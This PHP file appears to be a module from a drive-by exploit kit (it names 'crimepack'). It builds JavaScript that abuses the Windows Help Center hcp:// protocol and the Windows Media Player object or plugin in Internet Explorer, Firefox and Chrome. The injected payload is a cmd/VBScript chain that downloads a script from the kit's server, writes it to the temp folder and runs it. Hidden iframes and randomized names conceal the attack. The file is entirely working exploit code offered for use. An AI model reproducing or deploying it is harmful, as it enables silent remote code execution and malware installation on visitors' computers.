<?php
/**
 *
 * @	Version			:	1.1.7.0
 * @	Author			:	DrWhat
 * @	Release on		:	25.02.2013
 *
 */

include( 'hcp.stuff.php' );

if (( ( ( $browser == 'ie' && 7 <= $version ) || $browser == 'ff' ) || $browser == 'ch' )) {
	$randVar = $GLOBALS['cpFunctions']->CreateArrayString( rand( 10, 30 ), '100' );
	$strUrl = $GLOBALS['cpXplHelper']->GetURL( 'hcp', $browser, $os, 'hcp' );
	$asxUrl = $GLOBALS['cpXplHelper']->GetNormalURL(  ) . 'hcp.php?type=2';
	$x = getChar( 2, 20 );
	$content = 'cmd /c echo ' . $x[0] . '="' . $x[4] . '.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","' . $GLOBALS['cpXplHelper']->GetNormalURL(  ) . 'hcp.php?type=3&b=' . $browser . '&o=' . $os . '",false:.send():Set ' . $x[1] . ' = CreateObject("Scripting.FileSystemObject"):' . $x[3] . ' = ' . $x[1] . '.GetSpecialFolder(2) + "\" + ' . $x[0] . ':Set ' . $x[5] . '=' . $x[1] . '.CreateTextFile(' . $x[3] . '):' . $x[5] . '.WriteLine .responseText:End With:' . $x[5] . '.Close:SET ' . $x[6] . ' = CreateObject("WScript.Shell"):' . $x[6] . '.Run ' . $x[3] . ' > %TEMP%\' . $x[4] . '.vbs && %TEMP%\' . $x[4] . '.vbs && taskkill /F /IM helpctr.exe';
		$functionName = $ExploitFunctions[6];
		$eArray[] = '
	function ' . $functionName . '(){
		' . ($browser == 'ie' ? '
		if (window.ActiveXObject){

			' . ($version == '7' ? '
			var ' . $randVar[2] . ' = document.createElement("iframe");
			' . $randVar[2] . '.setAttribute("src", "' . urlencode( 'hcp://services/search?query=crimepack&topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=%3Cscript%20defer%3Eeval(Run(String.fromCharCode(' . EncryptVB( $content ) . ')))%3C/scr1pt%3E' ) . '".replace(/scr1pt/g,"script"));
			' . $randVar[2] . '.setAttribute("width", ' . rand( 1, 100 ) . ');
			' . $randVar[2] . '.setAttribute("height", ' . rand( 1, 100 ) . ');
			' . $randVar[2] . '.setAttribute("style", "border:none");
			document.body.appendChild(' . $randVar[2] . ');
			' : '
			var o = document.createElement("OBJECT");
			o.setAttribute("classid", "clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6");
			o.setAttribute("uiMode", "invisible");
			o.openPlayer("' . $asxUrl . '&b=' . $browser . '&o=' . $os . '");

			') . '
		}else{
			{next}
		}

		' : '

		var ' . $randVar[0] . '  = false;
		if (navigator.plugins && navigator.plugins.length){
			for (var ' . $randVar[1] . ' = 0; ' . $randVar[1] . ' < navigator.plugins.length; ' . $randVar[1] . '++){
				if (navigator.plugins[' . $randVar[1] . '].description.indexOf(\'Npdsplay\') !=- 1) {
				' . $randVar[0] . ' = true;
				break;
			}
		}
		if (' . $randVar[0] . '){
					var ' . $randVar[2] . ' = document.createElement(\'iframe\');
					' . $randVar[2] . '.setAttribute(\'src\', \'' . $asxUrl . '&b=' . $browser . '&o=' . $os . '\');
					' . $randVar[2] . '.setAttribute(\'width\', ' . rand( 1, 100 ) . ');
					' . $randVar[2] . '.setAttribute(\'height\', ' . rand( 1, 100 ) . ');
					' . $randVar[2] . '.setAttribute(\'style\', \'border:none\');
					document.body.appendChild(' . $randVar[2] . ');
		}else{
			{next}
			return;
		}
	}
	') . '
		setTimeout("{next}", 1500);
	}';
				}

?>
